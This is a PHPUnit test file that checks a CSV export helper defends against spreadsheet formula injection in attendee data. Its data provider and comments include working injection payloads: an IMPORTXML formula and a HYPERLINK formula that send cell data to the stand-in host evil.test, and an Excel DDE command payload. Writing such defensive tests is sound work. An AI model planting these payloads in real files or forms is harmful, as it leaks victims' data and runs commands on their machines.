<?php

namespace Tests\Feature;

use App\Support\CsvSafe;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * The attendee export carries text a stranger wrote. Anyone can RSVP to
 * a public Sayzio event and choose their own name, company, role,
 * message and answers to the organiser's custom questions. The person
 * who later opens that CSV is the organiser.
 *
 * A spreadsheet treats a cell beginning = + - @ (or a tab or CR, which
 * Excel strips before reading the next character) as a formula and runs
 * it on open. So an RSVP named
 *
 *   =IMPORTXML("https://evil.test/?d="&A2,"//a")
 *
 * exfiltrates the row beside it, silently, in Google Sheets, without
 * the attacker ever seeing the file -- the victim's own spreadsheet
 * makes the request.
 *
 * The mitigation is an apostrophe prefix, which every major spreadsheet
 * reads as "the rest of this cell is literal text" and does not display.
 * These tests pin the character set and the shape of the output; the
 * real-world payloads are there so a future reader can see what this is
 * defending against rather than having to imagine it.
 */
class AnAttendeeCannotPlantAFormulaTest extends TestCase
{
    public static function payloads(): array
    {
        return [
            'sheets exfiltration'  => ['=IMPORTXML("https://evil.test/?d="&A2,"//a")'],
            'hyperlink steal'      => ['=HYPERLINK("https://evil.test?x="&A1,"Results")'],
            'excel dde'            => ['=cmd|\'/c calc\'!A1'],
            'plus variant'         => ['+1+1'],
            'minus variant'        => ['-1+1'],
            'at variant'           => ['@SUM(A1:A9)'],
            'tab prefixed'         => ["\t=1+1"],
            'cr prefixed'          => ["\r=1+1"],
        ];
    }

    #[DataProvider('payloads')]
    public function test_a_formula_is_made_inert($payload): void
    {
        $out = CsvSafe::cell($payload);

        $this->assertSame("'" . $payload, $out, 'The payload should be prefixed, not altered.');
        $this->assertNotSame('=', $out[0], 'A cell must never still begin with a formula character.');
    }

    public function test_ordinary_values_are_left_exactly_alone(): void
    {
        // No leading +, -, =, @ here on purpose: those are prefixed, and
        // the phone-number case below states why that is right rather
        // than unfortunate. Listing one here contradicted that test.
        foreach (['Priya Sharma', 'priya@example.com', 'Acme Ltd', '', '0', 'a-b', 'x=y', '91 98765 43210'] as $value) {
            $this->assertSame($value, CsvSafe::cell($value), "Mangled an innocent value: {$value}");
        }
    }

    /**
     * A phone number is the awkward case: "+91..." legitimately starts
     * with a risky character. It is still prefixed, because a
     * spreadsheet cannot tell it from a formula either. The apostrophe
     * is not displayed, so the cell still reads as the number.
     */
    public function test_a_leading_plus_phone_number_is_prefixed_and_that_is_correct(): void
    {
        $this->assertSame("'+919876543210", CsvSafe::cell('+919876543210'));
    }

    public function test_non_strings_become_sensible_cells(): void
    {
        $this->assertSame('', CsvSafe::cell(null));
        $this->assertSame('1', CsvSafe::cell(true));
        $this->assertSame('0', CsvSafe::cell(false));
        $this->assertSame('42', CsvSafe::cell(42));
        $this->assertSame('a, b', CsvSafe::cell(['a', 'b']));
        $this->assertSame('2026-10-20 18:30:00', CsvSafe::cell(new \DateTimeImmutable('2026-10-20 18:30:00')));
    }

    public function test_an_array_answer_containing_a_formula_is_still_neutralised(): void
    {
        // Multi-select answers arrive as arrays; the join must not be a
        // way back in.
        $this->assertSame("'=1+1, =2+2", CsvSafe::cell(['=1+1', '=2+2']));
    }

    public function test_a_whole_row_is_covered_not_just_the_first_cell(): void
    {
        $row = CsvSafe::row(['Priya', '=1+1', 'Acme', '@SUM(A1)']);

        $this->assertSame(['Priya', "'=1+1", 'Acme', "'@SUM(A1)"], $row);
    }

    public function test_the_written_file_contains_no_live_formula(): void
    {
        $handle = fopen('php://memory', 'r+');
        CsvSafe::put($handle, ['Name', 'Message']);
        CsvSafe::put($handle, ['=cmd|\'/c calc\'!A1', '=HYPERLINK("https://evil.test","x")']);
        rewind($handle);
        $csv = stream_get_contents($handle);
        fclose($handle);

        // No field may begin with a formula character. Fields are either
        // at the line start or follow a comma, optionally quoted.
        $this->assertDoesNotMatchRegularExpression('/(^|,)"?[=+@]/m', $csv, "A live formula survived:\n{$csv}");
        $this->assertStringContainsString("'=cmd", $csv, 'The payload should still be present, just inert.');
    }
}
